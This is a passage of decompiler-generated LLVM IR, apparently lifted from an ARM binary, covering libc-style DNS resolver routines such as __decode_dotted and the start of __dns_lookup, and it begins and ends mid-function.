  store i32 %v0_15e70, i32* %r0.global-to-local, align 4
  store i32 %v6_15bf8, i32* %r5.global-to-local, align 4
  ret i32 %v0_15e70

; uselistorder directives
  uselistorder i32 %v0_15e70, { 1, 0 }
  uselistorder i1 %v7_15d3c, { 2, 0, 1 }
  uselistorder i32 %v0_15d3c.pre, { 1, 0, 2 }
  uselistorder i32 %v1_15dec, { 0, 2, 1 }
  uselistorder i32 %v0_15dd8, { 1, 0 }
  uselistorder i32 %v0_15dc0, { 1, 0 }
  uselistorder i32 %v5_15d6c, { 3, 4, 5, 6, 2, 1, 0, 7 }
  uselistorder i1 %v9_15d44, { 1, 0, 2 }
  uselistorder i32 %v2_15d6c68, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15d6870, { 5, 4, 2, 3, 0, 1 }
  uselistorder i1 %v7_15d3c67, { 1, 0 }
  uselistorder i32 %v2_15d24, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_15d34, { 1, 0, 2 }
  uselistorder i1 %v7_15d10, { 1, 0 }
  uselistorder i32 %v0_15d10, { 1, 2, 0 }
  uselistorder i32 %v1_15d34.pre, { 2, 0, 1 }
  uselistorder i32 %v0_15d08.pre, { 0, 1, 3, 2 }
  uselistorder i1 %v7_15cf8, { 1, 0 }
  uselistorder i1 %v7_15cf0, { 1, 0 }
  uselistorder i32 %v1_15ce4, { 1, 2, 0 }
  uselistorder i32 %v0_15cf8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15d0c, { 1, 2, 0, 3 }
  uselistorder i1 %v7_15cac, { 1, 0 }
  uselistorder i32 %v0_15ce4, { 2, 1, 0, 3 }
  uselistorder i32 %v0_15cc8, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_15cd8, { 3, 1, 0, 2 }
  uselistorder i32 %v1_15c68, { 1, 0, 2 }
  uselistorder i32 %v2_15c50, { 1, 0 }
  uselistorder i32 %v0_15c68, { 3, 1, 0, 2 }
  uselistorder i32 %v2_15c6c, { 0, 4, 3, 1, 2, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 16, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 14, 13, 15, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 15, 16, 17, 18, 19, 23, 20, 21, 22 }
  uselistorder i32 97, { 2, 3, 5, 1, 0, 6, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @sprintf, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_ffff.655 to i32), { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 3, 2 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_15e70, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_15e50, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15dec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15d3c, { 1, 0 }
  uselistorder label %dec_label_pc_15d10._crit_edge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15d10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15d08, { 1, 0 }
  uselistorder label %dec_label_pc_15ce4, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_15ce0, { 1, 0 }
  uselistorder label %dec_label_pc_15c98, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %v6_15e94 = load i32, i32* @r5, align 4
  %v0_15e98 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15e98, i32* %sl.global-to-local, align 4
  %v2_15e98 = icmp eq i32 %v0_15e98, 0
  br i1 %v2_15e98, label %.thread30, label %dec_label_pc_15ec0.preheader

.thread30:                                        ; preds = %entry
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_15f80

dec_label_pc_15ec0.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_15ec04 = load i32, i32* @r1, align 4
  %v6_15ec414 = icmp slt i32 %v0_15ec04, %arg2
  br i1 %v6_15ec414, label %dec_label_pc_15ec8.preheader, label %dec_label_pc_15f80

dec_label_pc_15ec8.preheader:                     ; preds = %dec_label_pc_15ec0.preheader
  %v2_15ec851 = add i32 %v0_15e98, %v0_15ec04
  %v3_15ec852 = inttoptr i32 %v2_15ec851 to i8*
  %v4_15ec853 = load i8, i8* %v3_15ec852, align 1
  %v6_15ec854 = zext i8 %v4_15ec853 to i32
  store i32 %v6_15ec854, i32* @r4, align 4
  %v2_15ecc55 = icmp eq i8 %v4_15ec853, 0
  br i1 %v2_15ecc55, label %bb49, label %dec_label_pc_15ed4

dec_label_pc_15ebc:                               ; preds = %bb48, %bb44
  %v1_15ec0 = phi i32 [ %v1_15ec0.pre, %bb48 ], [ %v1_15eec59, %bb44 ]
  %v0_15ec0 = phi i32 [ %v0_15ec0.pre, %bb48 ], [ %v5_15f04, %bb44 ]
  %v0_15ebc = phi i32 [ %v0_15ebc.pre, %bb48 ], [ %v0_15f0860, %bb44 ]
  store i32 %v0_15ebc, i32* %r0.global-to-local, align 4
  %v6_15ec4 = icmp slt i32 %v0_15ec0, %v1_15ec0
  br i1 %v6_15ec4, label %dec_label_pc_15ebc.dec_label_pc_15ec8_crit_edge, label %dec_label_pc_15f80

dec_label_pc_15ebc.dec_label_pc_15ec8_crit_edge:  ; preds = %dec_label_pc_15ebc
  %v0_15ec8.pre = load i32, i32* %sl.global-to-local, align 4
  %v2_15ec8 = add i32 %v0_15ec8.pre, %v0_15ec0
  %v3_15ec8 = inttoptr i32 %v2_15ec8 to i8*
  %v4_15ec8 = load i8, i8* %v3_15ec8, align 1
  %v6_15ec8 = zext i8 %v4_15ec8 to i32
  store i32 %v6_15ec8, i32* @r4, align 4
  %v2_15ecc = icmp eq i8 %v4_15ec8, 0
  %v0_15f6c = load i32, i32* @ip, align 4
  %v2_15f6c = icmp eq i32 %v0_15f6c, 0
  br i1 %v2_15ecc, label %dec_label_pc_15f6c, label %dec_label_pc_15ed4

dec_label_pc_15ed4:                               ; preds = %dec_label_pc_15ec8.preheader, %dec_label_pc_15ebc.dec_label_pc_15ec8_crit_edge
  %v2_15f6c66 = phi i1 [ %v2_15f6c, %dec_label_pc_15ebc.dec_label_pc_15ec8_crit_edge ], [ false, %dec_label_pc_15ec8.preheader ]
  %v0_15f6c64 = phi i32 [ %v0_15f6c, %dec_label_pc_15ebc.dec_label_pc_15ec8_crit_edge ], [ 1, %dec_label_pc_15ec8.preheader ]
  %v6_15ec863 = phi i32 [ %v6_15ec8, %dec_label_pc_15ebc.dec_label_pc_15ec8_crit_edge ], [ %v6_15ec854, %dec_label_pc_15ec8.preheader ]
  %v0_15ef462 = phi i32 [ %v0_15ec8.pre, %dec_label_pc_15ebc.dec_label_pc_15ec8_crit_edge ], [ %v0_15e98, %dec_label_pc_15ec8.preheader ]
  %v0_15ee461 = phi i32 [ %v0_15ec0, %dec_label_pc_15ebc.dec_label_pc_15ec8_crit_edge ], [ %v0_15ec04, %dec_label_pc_15ec8.preheader ]
  %v0_15f0860 = phi i32 [ %v0_15ebc, %dec_label_pc_15ebc.dec_label_pc_15ec8_crit_edge ], [ 0, %dec_label_pc_15ec8.preheader ]
  %v1_15eec59 = phi i32 [ %v1_15ec0, %dec_label_pc_15ebc.dec_label_pc_15ec8_crit_edge ], [ %arg2, %dec_label_pc_15ec8.preheader ]
  %v1_15ed8 = and i32 %v6_15ec863, 192
  br i1 %v2_15f6c66, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_15ed4
  %v1_15edc = load i32, i32* %r8.global-to-local, align 4
  %v2_15edc = add i32 %v1_15edc, 1
  store i32 %v2_15edc, i32* %r8.global-to-local, align 4
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_15ed4, %bb
  %v2_15ee0 = icmp eq i32 %v1_15ed8, 192
  %v1_15ee4 = add i32 %v0_15ee461, 1
  store i32 %v1_15ee4, i32* @r1, align 4
  br i1 %v2_15ee0, label %dec_label_pc_15eec, label %dec_label_pc_15f14

dec_label_pc_15eec:                               ; preds = %bb42
  %v6_15ef0 = icmp slt i32 %v1_15ee4, %v1_15eec59
  br i1 %v6_15ef0, label %dec_label_pc_15ef4, label %dec_label_pc_15f80

dec_label_pc_15ef4:                               ; preds = %dec_label_pc_15eec
  %v2_15ef4 = add i32 %v1_15ee4, %v0_15ef462
  %v3_15ef4 = inttoptr i32 %v2_15ef4 to i8*
  %v4_15ef4 = load i8, i8* %v3_15ef4, align 1
  %v6_15ef4 = zext i8 %v4_15ef4 to i32
  %v1_15efc = urem i32 %v6_15ec863, 64
  br i1 %v2_15f6c66, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_15ef4
  %v1_15f00 = load i32, i32* %r8.global-to-local, align 4
  %v2_15f00 = add i32 %v1_15f00, 1
  store i32 %v2_15f00, i32* %r8.global-to-local, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_15ef4, %bb43
  %v4_15f04 = mul nuw nsw i32 %v1_15efc, 256
  %v5_15f04 = or i32 %v6_15ef4, %v4_15f04
  store i32 %v5_15f04, i32* @r1, align 4
  store i32 %v0_15f0860, i32* %r7.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_15ebc

dec_label_pc_15f14:                               ; preds = %bb42
  %v2_15f14 = add i32 %v6_15ec863, %v0_15f0860
  store i32 %v2_15f14, i32* %r6.global-to-local, align 4
  %v3_15f18 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_15f18, i32* @r3, align 4
  %v1_15f1c = add i32 %v2_15f14, 1
  store i32 %v1_15f1c, i32* %r7.global-to-local, align 4
  %v3_15f20 = icmp ult i32 %v1_15f1c, %v3_15f18
  br i1 %v3_15f20, label %dec_label_pc_15f28, label %dec_label_pc_15f80

dec_label_pc_15f28:                               ; preds = %dec_label_pc_15f14
  %v2_15f28 = add i32 %v6_15ec863, %v1_15ee4
  store i32 %v2_15f28, i32* @r5, align 4
  %v3_15f2c = icmp ult i32 %v2_15f28, %v1_15eec59
  br i1 %v3_15f2c, label %dec_label_pc_15f34, label %dec_label_pc_15f80

dec_label_pc_15f34:                               ; preds = %dec_label_pc_15f28
  %v2_15f34 = add i32 %v1_15ee4, %v0_15ef462
  store i32 %v2_15f34, i32* @r1, align 4
  %v0_15f38 = load i32, i32* %sb.global-to-local, align 4
  %v2_15f38 = add i32 %v0_15f38, %v0_15f0860
  store i32 %v2_15f38, i32* @r0, align 4
  store i32 %v6_15ec863, i32* @r2, align 4
  %v0_15f44 = call i32 @memcpy()
  store i32 %v0_15f44, i32* %r0.global-to-local, align 4
  store i32 %v0_15f6c64, i32* @ip, align 4
  %v0_15f4c = load i32, i32* %sl.global-to-local, align 4
  %v1_15f4c = load i32, i32* @r5, align 4
  %v2_15f4c = add i32 %v1_15f4c, %v0_15f4c
  %v3_15f4c = inttoptr i32 %v2_15f4c to i8*
  %v4_15f4c = load i8, i8* %v3_15f4c, align 1
  br i1 %v2_15f6c66, label %bb46, label %bb45

bb45:                                             ; preds = %dec_label_pc_15f34
  %v1_15f54 = load i32, i32* %r8.global-to-local, align 4
  %v2_15f54 = load i32, i32* @r4, align 4
  %v3_15f54 = add i32 %v2_15f54, %v1_15f54
  store i32 %v3_15f54, i32* %r8.global-to-local, align 4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_15f34, %bb45
  %v2_15f58 = icmp eq i8 %v4_15f4c, 0
  br i1 %v2_15f58, label %bb48, label %bb47

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_15f64.off0 = phi i8 [ 0, %bb46 ], [ 46, %bb47 ]
  store i32 %v1_15f4c, i32* @r1, align 4
  %v2_15f64 = load i32, i32* %sb.global-to-local, align 4
  %v3_15f64 = load i32, i32* %r6.global-to-local, align 4
  %v4_15f64 = add i32 %v3_15f64, %v2_15f64
  %v5_15f64 = inttoptr i32 %v4_15f64 to i8*
  store i8 %v0_15f64.off0, i8* %v5_15f64, align 1
  %v0_15ebc.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_15ec0.pre = load i32, i32* @r1, align 4
  %v1_15ec0.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_15ebc

dec_label_pc_15f6c:                               ; preds = %dec_label_pc_15ebc.dec_label_pc_15ec8_crit_edge
  %v0_15f74.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_15f6c, label %dec_label_pc_15f80, label %bb49

bb49:                                             ; preds = %dec_label_pc_15ec8.preheader, %dec_label_pc_15f6c
  %v0_15f74.pre69 = phi i32 [ %v0_15f74.pre.pre, %dec_label_pc_15f6c ], [ 0, %dec_label_pc_15ec8.preheader ]
  %v2_15f70 = add i32 %v0_15f74.pre69, 1
  store i32 %v2_15f70, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15f80

dec_label_pc_15f80:                               ; preds = %dec_label_pc_15f28, %dec_label_pc_15f14, %dec_label_pc_15eec, %dec_label_pc_15ebc, %dec_label_pc_15f6c, %dec_label_pc_15ec0.preheader, %bb49, %.thread30
  %storemerge = phi i32 [ -1, %.thread30 ], [ %v2_15f70, %bb49 ], [ -1, %dec_label_pc_15ec0.preheader ], [ %v0_15f74.pre.pre, %dec_label_pc_15f6c ], [ -1, %dec_label_pc_15f14 ], [ -1, %dec_label_pc_15f28 ], [ -1, %dec_label_pc_15ebc ], [ -1, %dec_label_pc_15eec ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_15e94, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_15f74.pre.pre, { 1, 0 }
  uselistorder i32 %v1_15f4c, { 1, 0 }
  uselistorder i32 %v5_15f04, { 1, 0 }
  uselistorder i32 %v1_15ee4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_15f0860, { 3, 2, 0, 1 }
  uselistorder i32 %v6_15ec863, { 2, 4, 3, 0, 1 }
  uselistorder i1 %v2_15f6c66, { 1, 2, 0 }
  uselistorder i32 %v0_15e98, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_15f80, { 6, 4, 0, 1, 2, 3, 5, 7 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_15ed4, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp148 = call i32 @__decompiler_undefined_function_0()
  %tmp163 = call i32 @__decompiler_undefined_function_0()
  %tmp164 = call i32 @__decompiler_undefined_function_0()
  %tmp165 = call i32 @__decompiler_undefined_function_0()
  %tmp176 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-448 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-104 = alloca i16, align 2
  %stack_var_-76 = alloca i32, align 4
  %v3_15f8c = load i32, i32* @r4, align 4
  %v6_15f8c = load i32, i32* @r5, align 4
  %v9_15f8c = load i32, i32* @r6, align 4
  %v12_15f8c = load i32, i32* @r7, align 4
  %v15_15f8c = load i32, i32* @r8, align 4
  %v18_15f8c = load i32, i32* @sb, align 4
  %v21_15f8c = load i32, i32* @sl, align 4
  %v24_15f8c = load i32, i32* @fp, align 4
  %v27_15f8c = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg4, i32* @sb, align 4
  %v0_15fa0 = load i32, i32* %r1.global-to-local, align 4
  %v1_15fa8 = call i32 @malloc(i32 512)
  store i32 %v1_15fa8, i32* @sl, align 4
  %v0_15fb0 = load i32, i32* @r4, align 4
  %v1_15fb0 = inttoptr i32 %v0_15fb0 to i8*
  %v3_15fb4 = call i32 @strlen(i8* %v1_15fb0)
  store i32 894, i32* %r3.global-to-local, align 4
  %v3_15fc0 = icmp ugt i32 %v3_15fb4, 893
  store i1 %v3_15fc0, i1* %cpsr_c.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r8, align 4
  %tmp288 = icmp ugt i32 %v3_15fb4, 894
  br i1 %tmp288, label %.thread134, label %dec_label_pc_15fe0

.thread134:                                       ; preds = %entry
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16704

dec_label_pc_15fe0:                               ; preds = %entry
  store i32 %v3_15fb4, i32* %r2.global-to-local, align 4
  %v1_15fe4 = add i32 %v3_15fb4, 130
  %v1_15fe8 = call i32 @malloc(i32 %v1_15fe4)
  store i32 %v1_15fe8, i32* @r0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15fec = icmp eq i32 %v1_15fe8, 0
  br i1 %v2_15fec, label %.thread6, label %bb

bb:                                               ; preds = %dec_label_pc_15fe0
  %v1_15ff0 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_15ff0 = icmp eq i32 %v1_15ff0, 0
  br i1 %v3_15ff0, label %bb217, label %dec_label_pc_16004

.thread6:                                         ; preds = %dec_label_pc_15fe0
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_166fc

bb217:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_166fc

dec_label_pc_16004:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v0_16004 = load i32, i32* @r4, align 4
  %v1_16004 = inttoptr i32 %v0_16004 to i8*
  %v2_16004 = load i8, i8* %v1_16004, align 1
  %v3_16004 = zext i8 %v2_16004 to i32
  store i32 %v3_16004, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16008 = icmp eq i8 %v2_16004, 0
  br i1 %v2_16008, label %dec_label_pc_166fc, label %dec_label_pc_16010

dec_label_pc_16010:                               ; preds = %dec_label_pc_16004
  %v2_16014 = add i32 %v0_16004, %v3_15fb4
  store i32 %v2_16014, i32* %r3.global-to-local, align 4
  %v1_16018 = add i32 %v2_16014, -1
  %v2_16018 = inttoptr i32 %v1_16018 to i8*
  %v3_16018 = load i8, i8* %v2_16018, align 1
  %v4_16018 = zext i8 %v3_16018 to i32
  store i32 %v4_16018, i32* @r3, align 4
  store i32 %v3_15fb4, i32* @r2, align 4
  store i32 %v0_16004, i32* @r1, align 4
  %v0_16028 = call i32 @memcpy()
  store i32 15460, i32* %r3.global-to-local, align 4
  store i32 14352, i32* %r1.global-to-local, align 4
  store i32 1803, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r7, align 4
  %v2_160a0 = ptrtoint i32* %stack_var_-76 to i32
  %v2_161b0 = ptrtoint i16* %stack_var_-104 to i32
  %v2_161d8 = ptrtoint i32* %stack_var_-192 to i32
  %v3_161f8 = bitcast i32* %stack_var_-192 to i8*
  %v2_162ac = ptrtoint i32* %stack_var_-48 to i32
  %v2_16344 = icmp eq i32 %tmp165, 0
  %v1_16350 = add i32 %tmp164, -2
  %v2_16354 = icmp ne i32 %v1_16350, 0
  %tmp218 = icmp slt i32 %tmp163, 1
  %v2_16450 = ptrtoint i32* %stack_var_-448 to i32
  %v2_16454 = ptrtoint i32* %stack_var_-144 to i32
  %v5_166a857 = icmp sgt i32 %tmp163, 0
  %v2_165d0 = icmp ne i32 %v0_15fa0, 0
  %v7_165d0 = icmp eq i32 %v0_15fa0, 1
  %v1_164b8 = bitcast i32* %stack_var_-448 to i8*
  %v2_1656c = icmp eq i32 %tmp148, 0
  %v2_16360 = icmp ugt i8 %v3_16018, 45
  %v7_16360 = icmp eq i8 %v3_16018, 46
  %stack_var_-476.0.pre = load i32, i32* @r5, align 4
  %v4_160f4 = add i32 %v1_15fe8, %v3_15fb4
  %v5_160f4 = inttoptr i32 %v4_160f4 to i8*
  %v1_16350.cmp = icmp ugt i32 %v1_16350, 1
  %v2_16390 = icmp eq i32 %tmp164, 0
  %v3_165d4 = icmp ugt i32 %v0_15fa0, 27
  %v8_165d4 = icmp eq i32 %v0_15fa0, 28
  br label %dec_label_pc_16084

dec_label_pc_16084:                               ; preds = %dec_label_pc_166e4, %dec_label_pc_16010
  %stack_var_-476.0 = phi i32 [ %stack_var_-476.0.pre, %dec_label_pc_16010 ], [ %v1_166e8, %dec_label_pc_166e4 ]
  %stack_var_-464.0 = phi i32 [ %tmp176, %dec_label_pc_16010 ], [ %v3_16190, %dec_label_pc_166e4 ]
  %stack_var_-468.0 = phi i32 [ -1, %dec_label_pc_16010 ], [ %stack_var_-468.2, %dec_label_pc_166e4 ]
  %v1_1608c = phi i32 [ -1, %dec_label_pc_16010 ], [ %v3_16264, %dec_label_pc_166e4 ]
  store i32 %v1_1608c, i32* %r3.global-to-local, align 4
  %v2_16088 = icmp eq i32 %v1_1608c, -1
  store i1 %v2_16088, i1* %cpsr_c.global-to-local, align 1
  %v7_16088 = icmp eq i32 %v1_1608c, -1
  br i1 %v7_16088, label %bb220, label %bb219

bb219:                                            ; preds = %dec_label_pc_16084
  br label %bb220

bb220:                                            ; preds = %dec_label_pc_16084, %bb219
  %v1_16090 = xor i1 %v7_16088, true
  call void @__pseudo_cond_branch(i1 %v1_16090, i32 ptrtoint (i32* @global_var_10d90.892 to i32))
  %v0_1609c = load i32, i32* @r8, align 4
  %v2_1609c = add i32 %v0_1609c, 76
  %v3_1609c = inttoptr i32 %v2_1609c to i32*
  %v4_1609c = load i32, i32* %v3_1609c, align 4
  store i32 %v4_1609c, i32* @r4, align 4
  store i32 %v2_160a0, i32* @r5, align 4
  %v2_160a4 = add i32 %v0_1609c, 72
  %v3_160a4 = inttoptr i32 %v2_160a4 to i32*
  %v4_160a4 = load i32, i32* %v3_160a4, align 4
  store i32 %v4_160a4, i32* %r1.global-to-local, align 4
  store i32 %v4_1609c, i32* %r2.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_160b4 = add i32 %v0_1609c, 120
  %v3_160b4 = inttoptr i32 %v2_160b4 to i32*
  %v4_160b4 = load i32, i32* %v3_160b4, align 4
  call void @__pseudo_branch(i32 %v4_160b4)
  %v0_160c8 = load i32, i32* @r8, align 4
  %v2_160c8 = add i32 %v0_160c8, 16
  %v3_160c8 = inttoptr i32 %v2_160c8 to i32*
  %v4_160c8 = load i32, i32* %v3_160c8, align 4
  store i32 90324, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_160c8)
  %v0_160d4 = call i32 @__open_nameservers()
  %v0_160dc = load i32, i32* @r8, align 4
  %v2_160dc = add i32 %v0_160dc, 15460
  %v3_160dc = inttoptr i32 %v2_160dc to i32*
  %v4_160dc = load i32, i32* %v3_160dc, align 4
  store i32 %v1_15fe8, i32* %r1.global-to-local, align 4
  store i32 %v3_15fb4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @fp, align 4
  %v0_160ec = load i32, i32* @r7, align 4
  %v3_160ec = icmp uge i32 %v0_160ec, %v4_160dc
  store i1 %v3_160ec, i1* %cpsr_c.global-to-local, align 1
  store i8 0, i8* %v5_160f4, align 1
  %v0_160f8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_160f8, label %dec_label_pc_1611c, label %dec_label_pc_160fc

dec_label_pc_160fc:                               ; preds = %bb220
  store i32 46, i32* %r3.global-to-local, align 4
  %v2_16100 = load i32, i32* %r1.global-to-local, align 4
  %v3_16100 = load i32, i32* %r2.global-to-local, align 4
  %v4_16100 = add i32 %v3_16100, %v2_16100
  %v5_16100 = inttoptr i32 %v4_16100 to i8*
  store i8 46, i8* %v5_16100, align 1
  %v0_16108 = load i32, i32* @r8, align 4
  %v2_16108 = add i32 %v0_16108, 15448
  %v3_16108 = inttoptr i32 %v2_16108 to i32*
  %v4_16108 = load i32, i32* %v3_16108, align 4
  store i32 %v4_16108, i32* %r3.global-to-local, align 4
  %v0_1610c = load i32, i32* %r1.global-to-local, align 4
  %v1_1610c = add i32 %v0_1610c, 1
  %v1_16110 = load i32, i32* %r2.global-to-local, align 4
  %v2_16110 = add i32 %v1_1610c, %v1_16110
  %v1_16114 = load i32, i32* @r7, align 4
  %v2_16114 = and i32 %v1_16114, 1073741824
  %v3_16114 = icmp ne i32 %v2_16114, 0
  store i1 %v3_16114, i1* %cpsr_c.global-to-local, align 1
  %v4_16114 = mul i32 %v1_16114, 4
  %v5_16114 = add i32 %v4_16114, %v4_16108
  %v6_16114 = inttoptr i32 %v5_16114 to i32*
  %v7_16114 = load i32, i32* %v6_16114, align 4
  store i32 %v7_16114, i32* @r1, align 4
  %v2_16118 = inttoptr i32 %v2_16110 to i8*
  %v3_16118 = call i32 @strcpy(i8* %v2_16118, i32 %v7_16114)
  br label %dec_label_pc_1611c

dec_label_pc_1611c:                               ; preds = %bb220, %dec_label_pc_160fc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16120 = icmp slt i32 %stack_var_-468.0, 0
  br i1 %v1_16120, label %dec_label_pc_16128, label %dec_label_pc_1611c.dec_label_pc_16158_crit_edge

dec_label_pc_1611c.dec_label_pc_16158_crit_edge:  ; preds = %dec_label_pc_1611c
  %v0_16160.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_16158

dec_label_pc_16128:                               ; preds = %dec_label_pc_1611c
  store i32 15456, i32* %r3.global-to-local, align 4
  store i32 1803, i32* %r1.global-to-local, align 4
  %v0_16130 = load i32, i32* @r8, align 4
  %v2_16130 = add i32 %v0_16130, 15456
  %v3_16130 = inttoptr i32 %v2_16130 to i32*
  %v4_16130 = load i32, i32* %v3_16130, align 4
  store i32 %v4_16130, i32* %r2.global-to-local, align 4
  %v2_16134 = add i32 %v0_16130, 1803
  %v3_16134 = inttoptr i32 %v2_16134 to i8*
  %v4_16134 = load i8, i8* %v3_16134, align 1
  %v6_16134 = zext i8 %v4_16134 to i32
  %v2_16138 = mul i32 %v6_16134, %v4_16130
  store i32 1800, i32* %r2.global-to-local, align 4
  store i32 14352, i32* %r3.global-to-local, align 4
  %v2_16148 = add i32 %v0_16130, 1800
  %v3_16148 = inttoptr i32 %v2_16148 to i16*
  %v4_16148 = load i16, i16* %v3_16148, align 2
  %v6_16148 = zext i16 %v4_16148 to i32
  store i32 %v6_16148, i32* %r2.global-to-local, align 4
  %v2_1614c = add i32 %v0_16130, 14352
  %v3_1614c = inttoptr i32 %v2_1614c to i32*
  %v4_1614c = load i32, i32* %v3_1614c, align 4
  store i32 %v4_1614c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16158

dec_label_pc_16158:                               ; preds = %dec_label_pc_1611c.dec_label_pc_16158_crit_edge, %dec_label_pc_16128
  %v2_1619c = phi i32 [ %v0_16130, %dec_label_pc_16128 ], [ %v0_16160.pre, %dec_label_pc_1611c.dec_label_pc_16158_crit_edge ]
  %stack_var_-464.1 = phi i32 [ %v6_16148, %dec_label_pc_16128 ], [ %stack_var_-464.0, %dec_label_pc_1611c.dec_label_pc_16158_crit_edge ]
  %stack_var_-468.1 = phi i32 [ %v4_1614c, %dec_label_pc_16128 ], [ %stack_var_-468.0, %dec_label_pc_1611c.dec_label_pc_16158_crit_edge ]
  %stack_var_-476.1 = phi i32 [ %v2_16138, %dec_label_pc_16128 ], [ %stack_var_-476.0, %dec_label_pc_1611c.dec_label_pc_16158_crit_edge ]
  store i32 15456, i32* %r3.global-to-local, align 4
  %v2_16160 = add i32 %v2_1619c, 15456
  %v3_16160 = inttoptr i32 %v2_16160 to i32*
  %v4_16160 = load i32, i32* %v3_16160, align 4
  store i32 %v4_16160, i32* %r2.global-to-local, align 4
  store i32 15452, i32* %r3.global-to-local, align 4
  %v3_16168 = icmp uge i32 %stack_var_-468.1, %v4_16160
  store i1 %v3_16168, i1* %cpsr_c.global-to-local, align 1
